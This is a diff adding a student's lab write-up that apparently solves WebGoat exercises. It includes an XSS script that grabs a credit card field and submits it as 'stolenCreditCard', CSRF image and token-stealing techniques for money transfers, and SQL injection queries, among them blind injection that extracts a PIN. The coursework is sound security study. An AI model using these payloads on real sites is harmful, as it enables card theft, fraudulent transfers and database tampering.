@@ -2,4 +2,81 @@
 #Eva Bernal, 1002252313, e.bernal@mail.utoronto.ca
 
 Part 1 Explanation:
-...
+
+- The vulnerability exploited was the lack of input filtering, neither in length nor input type (html, scripts etc.).
+- Created a new form in javascript because I was finding that any form that I was creating with HTML was being absorbed up into a parent form. I used that parent form to collect values for a username and password, and fed it into my form to_submit, to match the POST URL specified on the site.
+
+
+Part 2 Explanation:
+
+What's encoded (with spaces and newlines removed):
+
+<script>
+
+function myOnClick(){
+  let to_submit = document.createElement("form");
+  to_submit.setAttribute("action", "/WebGoat/catcher");
+
+  let propertyElement = document.createElement("input");
+  propertyElement.setAttribute("type", "text");
+  propertyElement.setAttribute("name", "PROPERTY");
+  propertyElement.setAttribute("value", "yes");
+  to_submit.appendChild(propertyElement);
+
+  let card = document.forms["form"]["input1"].value;
+  let usrElement = document.createElement("input");
+  usrElement.setAttribute("type", "text");
+  usrElement.setAttribute("value", card);
+  usrElement.setAttribute("name", "stolenCreditCard"); 
+  to_submit.appendChild(usrElement);
+
+  document.body.appendChild(to_submit);
+
+  to_submit.submit();
+ }
+  
+window.addEventListener('DOMContentLoaded', function(){
+	document.forms["form"]["buy"].onclick = function() {return false};
+	document.forms["form"]["buy"].addEventListener("click", myOnClick);
+});
+
+</script>
+
+- involves same strategy of part 1 of crafting a URL post via a form 
+- the form is set to submit on click of the other form'ss submission button (while suppressing the submission of the original form)
+- involved postponing the running of the script until after the page finishes loading, otherwise wouldn't be able to find the submit button to override its behaviour (since it's found higher up in DOM) 
+- the vulnerability is that any kind of input could be placed into the 3 digit access code field, and that whatever was placed there was placed on the dom as 'input2' ~ including text surrounded with <script> tags that would be interpreted as such
+
+
+Part 3 Explanation:
+
+Paste the URL into message, set an enticing title and submit. The message will be posted on the message board and a person will open the message. The message field will be interpreted at html, thereby including an image element, the URL of which transfers 5000 units from the unsuspecting user. 
+
+
+Part 4 Explanation:
+
+
+Part 5 Explanation:
+
+The body makes a request to the transfer main page, and parses the secret token 
+that is hidden on the page, after obtaining the token, it'll make the second 
+frame load the transfer page with the token that was just obtained.
+
+
+Part 6 Explanation:
+
+This works because we.ve added a OR TRUE statement followed by a comment marker which cancels the closing quote. This allows us to return everything. This is a SQL injection vulnerability.
+
+
+Part 7 Explanation:
+
+The first part of this attack works because we injected another SQL command by using the semicolon. The second command sets the salary to 555000 if userid is 101. The second part works due to the same reason, except this time we add logic to initialize a SQL Trigger that is called everytime a new employee is made. This is a SQL injection vulnerability due to not cleansed client input.
+
+
+Part 8 Explanation:
+
+Value of PIN: 4862
+Command used:
+101 and ((select pin from credit where cc_number='1234123412341234') = 4862);
+
+Which returned 'Account number is valid.'; the strategy used was to test with greater conditions to narrow down the pin in a binary search banner. Example: 101 and ((select pin from credit where cc_number='1234123412341234') = 1000); This works because it serves as a condition that is injected to the database to gives us information on what the pin is.
